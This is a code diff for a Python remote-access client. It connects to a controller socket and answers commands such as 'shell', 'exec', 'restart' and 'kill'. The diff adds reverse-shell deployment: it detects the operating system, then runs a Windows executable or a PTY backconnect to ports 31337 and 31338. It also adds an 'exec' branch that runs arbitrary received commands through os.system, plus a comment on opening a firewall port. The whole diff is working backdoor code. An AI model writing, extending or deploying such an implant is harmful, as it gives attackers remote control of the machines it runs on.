@@ -1,14 +1,20 @@
 #!/usr/bin/env python
+# TO open port on linux : sudo  iptables -I INPUT -p tcp --dport 7888 --syn -j ACCEPT
 import socket
-import os, pty
+import os
+if os.name == 'posix': # Linux
+	import pty
+	import tcp_pty_backconnect
 from time import sleep
-import tcp_pty_backconnect
+
 
 from threading import Thread
 from time import sleep
 
-TCP_IP = '127.0.0.1'
-TCP_PORT = 4444
+TCP_IP       = '127.0.0.1'
+TCP_PORT     = 4444
+PTY_PORT_LIN = 31337
+PTY_PORT_WIN = 31338
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -31,13 +37,30 @@ thread.start()
 while True:
     data = s.recv(8192)
     if "shell" in data:
-        sleep(1)
-        tcp_pty_backconnect.run()
+        s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s1.connect((TCP_IP, 7888))
+		
+        if os.name == 'nt': # Windows
+           s1.send("nt")
+        else:
+           s1.send("posix")
+        shelltodeploy = s1.recv(1024)
+        if shelltodeploy == 'nt': # Windows
+            sleep(1)
+            os.system("%s\\windows.exe %s %s" % (os.path.dirname(os.path.abspath(__file__)),TCP_IP, str(PTY_PORT_WIN)))
+        elif shelltodeploy == "posix": # Linux
+            sleep(1)
+            tcp_pty_backconnect.run(TCP_IP,PTY_PORT_LIN)
         os._exit(0)
     elif "restart" in data:
         os._exit(0)
     elif "kill" in data:
         inpty(["pkill", "handler.sh"])
         os._exit(0)
+    elif "exec " in data:
+        commandtoexecute = data.split(" ")[1]
+        os.system(commandtoexecute)
+
+            
 
 
